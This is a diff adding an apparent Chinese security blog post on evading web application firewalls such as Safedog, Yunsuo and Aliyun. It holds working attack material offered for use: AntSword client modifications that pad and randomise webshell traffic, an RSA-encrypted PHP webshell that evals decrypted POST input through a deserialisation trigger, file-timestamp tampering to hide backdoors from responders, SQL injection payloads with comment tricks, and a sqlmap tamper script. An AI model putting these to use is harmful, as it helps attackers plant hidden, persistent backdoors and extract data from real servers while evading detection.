@@ -261,6 +261,211 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2020/05/20/Waf_Bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/20/Waf_Bypass/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-20T10:57:44+08:00">
+                2020-05-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Waf-Bypass"><a href="#Waf-Bypass" class="headerlink" title="Waf_Bypass"></a>Waf_Bypass</h1><ul>
+<li>默认webshell免杀</li>
+<li>WAF:阿里云，云锁，安全狗，D盾</li>
+</ul>
+<h2 id="0x01-流量免杀"><a href="#0x01-流量免杀" class="headerlink" title="0x01 流量免杀"></a>0x01 流量免杀</h2><p>这里主要针对开源的蚁剑，好用且能自定义。</p>
+<p>公开的菜刀工具，流量肯定是被监测的死死的，事实上蚁剑默认的流量都已经是混淆过的了，加上蚁剑自带的各类编码器，流量看起来已经非常复杂了。但是waf是可以解密流量的，公开的加密编码方式其实没那么好用.</p>
+<p>在对流量分析中，菜刀默认情况下是有自带特征的，尽管不同菜刀也会对自己的流量进行各种层度的混淆，不过公开的工具嘛，流量肯定被安全厂商检测的死死的，只要是公开的就逃不掉的。</p>
+<p>菜刀的流量特征主要是HTTP请求头特征，payload特征。</p>
+<h3 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h3><p>HTTP请求头特征虽然明显，但是waf不检测这个地方，不过为了以防万一，我们肯定要做点什么的。</p>
+<p>注释掉默认USER_AGENT，实现随机UA头。</p>
+<p><code>AntSword\antSword-master\modules\request.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求UA</span></span><br><span class="line"><span class="comment">// const USER_AGENT = 'AntSword';</span></span><br><span class="line"><span class="keyword">let</span> USER_AGENTS = [</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Tablet/15E148 Safari/604.1"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1"</span>,</span><br><span class="line">	<span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian"</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> USER_AGENT = USER_AGENTS[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*USER_AGENTS.length+<span class="number">1</span>)];</span><br></pre></td></tr></table></figure>
+
+<p>效果图</p>
+<p>![image-20200314151437294](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200314151437294.png)</p>
+<h3 id="Payload流量特征"><a href="#Payload流量特征" class="headerlink" title="Payload流量特征"></a>Payload流量特征</h3><p>payload流量为监测重点，我想了想，在公开的加密方式可以解密的情况下，恐怕得自写加密了，然后就看到了yzddmr6大佬的数据填充法，然后抄作业。</p>
+<p>利用大量垃圾数据的填充使得waf监测不过来,垃圾数据由自写函数生成。</p>
+<p>实测waf情况分为：数据过多直接放弃检测，数据过多只检测一部分。</p>
+<p>在没有对payload处理的情况下也能过Waf,且不影响对payload的各种处理，不过我觉得还对payload本身进行处理，不然别人分析了流量还是会很快暴露，以达到万无一失的结果。</p>
+<p><code>AntSword\antSword-master\modules\request.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">行数 <span class="number">49</span></span><br><span class="line"><span class="keyword">let</span> varname_min = <span class="number">5</span>; <span class="comment">//变量名最小长度</span></span><br><span class="line"><span class="keyword">let</span> varname_max = <span class="number">15</span>; <span class="comment">// 变量名最大长度</span></span><br><span class="line"><span class="keyword">let</span> data_min = <span class="number">200</span>; <span class="comment">// 变量值最小长度</span></span><br><span class="line"><span class="keyword">let</span> data_max = <span class="number">250</span>; <span class="comment">// 变量值最大长度</span></span><br><span class="line"><span class="keyword">let</span> num_min = <span class="number">150</span>; <span class="comment">// 变量最小个数</span></span><br><span class="line"><span class="keyword">let</span> num_max = <span class="number">250</span>; <span class="comment">// 变量最大个数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomString</span>(<span class="params">length</span>) </span>&#123; <span class="comment">// 生成随机字符串</span></span><br><span class="line">  <span class="comment">//let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';</span></span><br><span class="line">  <span class="keyword">let</span> chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = length; i &gt; <span class="number">0</span>; --i) result += chars[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * chars.length)];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomInt</span>(<span class="params">min, max</span>) </span>&#123;   <span class="comment">//生成指定范围内的随机数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>) + min, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomDict</span>(<span class="params">dic</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tmparray=[]</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> dic)&#123;</span><br><span class="line">    tmparray.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">  tmparray=tmparray.sort(<span class="function">(<span class="params">a, b</span>)=&gt;</span> &#123; <span class="keyword">return</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? <span class="number">-1</span> : <span class="number">1</span>; &#125;)</span><br><span class="line">  <span class="keyword">let</span> finaldata=&#123;&#125;</span><br><span class="line">  tmparray.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">      finaldata[i]=dic[i]</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> finaldata</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">行数 <span class="number">251</span> &amp; <span class="number">398</span></span><br><span class="line">      <span class="comment">// 通过替换函数方式来实现发包方式切换, 后续可改成别的</span></span><br><span class="line">      <span class="keyword">const</span> old_send = _request.send;</span><br><span class="line">      <span class="keyword">let</span> _postarr = [];</span><br><span class="line">      <span class="keyword">if</span> (opts[<span class="string">'useMultipart'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        _request.send = _request.field;</span><br><span class="line">        _postarr = _postData;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(opts[<span class="string">'addMassData'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; randomInt(num_min,num_max); i++) &#123; <span class="comment">//将混淆流量放入payload数组中</span></span><br><span class="line">            _postData[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max))</span><br><span class="line">          &#125;</span><br><span class="line">          _postData=randomDict(_postData);</span><br><span class="line">          <span class="comment">//logger.debug(_postData);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>先对自有编码器进行测试，对random,base64,chr,chr16,rot13进行流量分析。均有明显的密文特征，且能被解密。</p>
+<p>经过Waf测试,chr16加密是效果最好的加密方式了，可以达到过waf的要求，猜测waf不能解密chr16，但是chr16依旧是公开加密，密文特征也很明显，用不了多久可能也会进入waf全家桶，所以这并不是终点。</p>
+<p>然后我发现了蚁剑的RSA编码器，通过非对称加密的方式实现密文的不可逆，不过需要对webshell进行一定的处理，然后发现处理后的免杀一句话有点长。</p>
+<p>这样的马还有一个优点，只有自己能连，除非你把私钥分享给了别人，或者说流量重放。</p>
+<p>流量重放的话问题不大，主要是可以通过重放来分析进行了什么操作，解决流量重放可以用蚁剑作者的时间戳.</p>
+<p>此时流量在限定时间内有效，过时即无响应包。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ring = <span class="string">"demo"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $cmd=(<span class="keyword">$this</span>-&gt;ring); </span><br><span class="line">	$pk = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDf5VtIkyIbO78PExipZY3P2CS</span></span><br><span class="line">bYIGXU9T/V8Rva6OTfeYACHsBYLNSq7OXA0006wXxHKrOM48nH59kr9ZBcQ4z8O/</span><br><span class="line">TJUit2W81koiQ8TVvael5RCszm3Usx1vE21Rsqr1aL7QaRKsv00Z/MBacKptAs27</span><br><span class="line">gTD0FC4mgvbpCmIwyQIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line">	$cmds = explode(<span class="string">"|"</span>, $cmd);</span><br><span class="line">	$pk = openssl_pkey_get_public($pk);</span><br><span class="line">	$cmd = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ($cmds <span class="keyword">as</span> $value) &#123;</span><br><span class="line">  	<span class="keyword">if</span> (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    	$cmd .= $de;</span><br><span class="line"> 		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">eval</span>($cmd); </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ring = $_POST[<span class="string">'ring'</span>];</span><br><span class="line">$len = strlen($ring)+<span class="number">1</span>;</span><br><span class="line">$pp = <span class="string">"O:1:\"A\":1:&#123;s:4:\"ring\";s:"</span>.$len.<span class="string">":\""</span>.$ring.<span class="string">";\";&#125;"</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line">$ring_unser = unserialize($pp); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">"_"</span>] = <span class="string">`if((time()-<span class="subst">$&#123;<span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="built_in">Date</span>().getTime())<span class="regexp">/1000)&#125;)&gt;5)&#123;die();&#125;;$&#123;data['_']&#125;`;/</span><span class="regexp">/解决流量重放</span></span></span></span><br></pre></td></tr></table></figure>
+
+<p>经过流量分析，此时流量在没有私钥的情况下已经无法解密，此时waf已经无法解密，更不用说识别流量了。</p>
+<p>payload去url编码的结果。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D+<span class="number">45</span>iuPA7sMEczA3ZXzpCLicTNR/goVvH75VNW/<span class="number">2</span>XRBsJm8N3CiCYw21oi1o8r5Rj1g0lqioILuLd7bh8Bu2Yl5CJNCJ+<span class="number">6</span>+fZs02 NtrP8bqs8gqFBdTDEP2WjBJEealna0oy62i0SwqB7MprZO0tEU8qNPuQ2MMa4Rh/<span class="number">3</span>sY2xiY=|oPn0QtnZaSfmRey7SVZzcdFR7aw ukf/fnU05D9zTYRD0ggxJnhXheFx5OCu3SoYPyw5noE2kx/yY5YhciIv2VTN0d6mkx0L2jdv1w3Wf5TgCMNc5PAF0kdXa1cmJB3C e4BXsYJkbGb85ryu37noWz4v/cTKDSgS6IxuBiAEU2ks=|Lx0LCYoSVP/<span class="number">4</span>CTig0AWNly9muBr+HBmwK5wMKHC+a4NIxhFMRXJCNf RJGCRLtggOZvOkGXAUUU7G0UKg7AdG1SjuA4mL41/Gs/cWqLa+WJp8hlP1CIMQHliR5fG9MMq4ChnrtC0Hf70ndv4j/JCBAIN+yU aaTDvEHNeImYDp66E=|r8g/<span class="number">9</span>GwWB9qta87Stsd+<span class="number">5</span>jkfg0vRiDN+/NH1bQkROH2EhGGVJn+ZwB+<span class="number">0</span>INcbvM+NEIcj4LSa13Ge0gb3s <span class="number">8</span>tPXfJpEmtrqMigTk5jjEg2Vs9GUdKHHNgRT/v1ykrIQNGAgF0O9dzeyOYd8h80dtJ1cB7DlZnBwJ/tcNtOr3hS1fs=|JLXWPuCC hMGjZD5rqEtwwjKRpFxrXErXU2rW+<span class="number">1</span>DsAy4P1LBPcJ+Gbi1H3qxcgbtGxQMlWU59JyDsUrOAQ3hMl7pUoeBfP/XuvEbaJnr4ZrIa ZuAfsGwagtOnECxMrXHvbIo+<span class="number">774</span>dO+FM2F2BTZol6y/q+XI2VEPafEFkd7jiHQw=|UR1Ao61+RsFk9IoNehu7QtaMjBdovrIt2mn TqdXageeDmaK</span><br></pre></td></tr></table></figure>
+
+<p>![](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200314124155221.png)</p>
+<p>加上之前的垃圾数据填充模块，可以实现密文的进一步隐藏，在一堆垃圾数据里面找到这段payload，真的是流量分析的梦魇。</p>
+<p>![image-20200314124943576](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200314124943576.png)</p>
+<p>不过我也分析了一下，只有这段payload有url编码，且payload相对过长，加上每次流量的连接密码变量为相同的，且响应包为明文，所以想要分析还是有办法的。</p>
+<p>但是，我们还可以在垃圾数据填充上做手脚，修改代码以达到我想要的目的，加长单条垃圾数据到payload水平，垃圾数据池中加入会被url编码的符号。而连接密码暂无特别好的办法，不过我已经非常满意了。</p>
+<p>然后我又分析了冰歇的动态加密，流量无法解密，连接密码只用于获取随机密钥，建立连接后流量就全是payload了，响应包也全为密文，看上去确实无懈可击，但是问题在于它不开源，很多特征没办法修改，以至于现在流量已经能被部分waf检测到了。</p>
+<p>不过，动态加密于蚁剑也是可以实现的，还未尝试。</p>
+<p><img src="https://p0.ssl.qhimg.com/t01f99f00f458c488e9.png" alt="img"></p>
+<h2 id="0x02-Webshell持久化"><a href="#0x02-Webshell持久化" class="headerlink" title="0x02 Webshell持久化"></a>0x02 Webshell持久化</h2><blockquote>
+<p>关于Webshell持久化，其实并不像远控持久化那样，可以使用各种系统层面的操作。</p>
+<p>如果都能远控持久化了，webshell也就没必要了，难道说我还要写个用于生成webshell自启动吗，感觉有点舍本逐末了，私以为webshell相对远控的好处在于安静，不用就不会有动静。</p>
+<p>所以webshell持久化主要在于隐藏shell文件。</p>
+</blockquote>
+<ul>
+<li>修改配置文件如php.ini,.htaccess，.user.ini</li>
+<li>不死马。</li>
+<li>插马到正常文件，或修改正常文件使其出现后门，例如404页面.</li>
+<li>数据流隐写</li>
+<li>内存马</li>
+</ul>
+<p>但是实际上并没有那么好用，尤其是修改配置文件，于是我就去问了问做应急响应的表哥。</p>
+<p>不免杀，有隐藏属性的文件，数据流隐写，配置文件，会被重点关注。</p>
+<p>如果第一步没找到，就从文件创建时间来排查，和日志进行比对查找。</p>
+<p>终极手段，文件完整校验，可以与cms初始文件比对，或者说有单独文件服务器，可以做hash值比对。</p>
+<p>不然就很难发现。</p>
+<p>所以最方便的还是 <code>无特征免杀马+时间修改为正常文件时间+正常的四五级目录+正常文件名</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将demo.php的最后修改时间改为2020年1月26日14点5分10秒</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">touch(<span class="string">"demo.php"</span>,mktime(<span class="number">14</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">26</span>,<span class="number">2020</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-Sql-bypass"><a href="#0x03-Sql-bypass" class="headerlink" title="0x03 Sql_bypass"></a>0x03 Sql_bypass</h2><blockquote>
+<p>waf的检测形式，在于对语句的检测，关键点在于对关键语句的加花。</p>
+<p>单一的语句不杀，连在一起才杀，注释符是个好东西。</p>
+</blockquote>
+<h3 id="Safedog"><a href="#Safedog" class="headerlink" title="Safedog"></a>Safedog</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内联</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.222</span><span class="number">.134</span>/demo.php?id=<span class="number">1</span><span class="comment">/*!00000union*/</span><span class="comment">/*!00000all*/</span><span class="comment">/*!00000select*/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +</span></span><br><span class="line">注释换行</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.222</span><span class="number">.134</span>/demo.php?id=<span class="number">1</span><span class="string">'order%23%0aby 3 -- +</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Tamper"><a href="#Tamper" class="headerlink" title="Tamper"></a>Tamper</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">	singleTimeWarnMessage(<span class="string">"Bypass safedog 4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> payload:</span><br><span class="line">		payload=payload.replace(<span class="string">" "</span>,<span class="string">"/*!*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"="</span>,<span class="string">"/*!*/=/*!*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"AND"</span>,<span class="string">"/*!*/AND/*!*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"UNION"</span>,<span class="string">"union/*!23333cas*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"#"</span>,<span class="string">"/*!*/#"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"USER()"</span>,<span class="string">"USER/*!()*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"DATABASE/*!()*/"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"--"</span>,<span class="string">"/*!*/--"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"SELECT"</span>,<span class="string">"/*!23333cas*/select"</span>)</span><br><span class="line">		payload=payload.replace(<span class="string">"FROM"</span>,<span class="string">"/*!23333c*//*!23333c*/from"</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> payload</span><br><span class="line">		</span><br><span class="line"><span class="comment">### sqlmap -u http://192.168.222.128/demo.php?id=1 --identify-waf --random-agent -v 3 --tamper=safedog --dbs</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注释</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">130.135</span>/Less-<span class="number">1</span>/?id=<span class="number">1</span>'  <span class="keyword">and</span> strcmp((substr((<span class="keyword">select</span> <span class="comment">/*from*/</span>),<span class="number">2</span>,<span class="number">1</span>)),<span class="string">'0'</span>)<span class="comment">--</span></span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">130.135</span>/Less-<span class="number">1</span>/?id=<span class="number">1</span>'  <span class="keyword">and</span> strcmp((substr((<span class="keyword">select</span> password<span class="comment">/* -- + %0afrom/**/</span>users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="symbol">'D</span>')<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="垃圾数据填充法"><a href="#垃圾数据填充法" class="headerlink" title="垃圾数据填充法"></a>垃圾数据填充法</h3><blockquote>
+<p>WAF遇到大量数据时会直接放行，也存在于sql。</p>
+<p>云锁需要30k.</p>
+<p>阿里云需要200+的键值对。</p>
+<p>经过本地测试成功Bypass云锁，不过云锁还是会报警，且垃圾数据只能用于POST注入。</p>
+</blockquote>
+<p>垃圾数据可由IDLE生成，或者由脚本生成，需要生成多少直接修改脚本内容即。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">varname_min = <span class="number">5</span></span><br><span class="line">varname_max = <span class="number">15</span></span><br><span class="line">data_min = <span class="number">20</span></span><br><span class="line">data_max = <span class="number">25</span></span><br><span class="line">num_min = <span class="number">50</span></span><br><span class="line">num_max = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(length)</span>:</span></span><br><span class="line">    str_list = [random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(length)]</span><br><span class="line">    random_str = <span class="string">''</span>.join(str_list)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num_min,num_max):</span><br><span class="line">        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))</span><br><span class="line">    print(<span class="string">'&amp;'</span>+parse.urlencode(data)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2020/02/24/WordPress_4.6_RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1193,6 +1398,202 @@
   
   
   <div class="post-block">
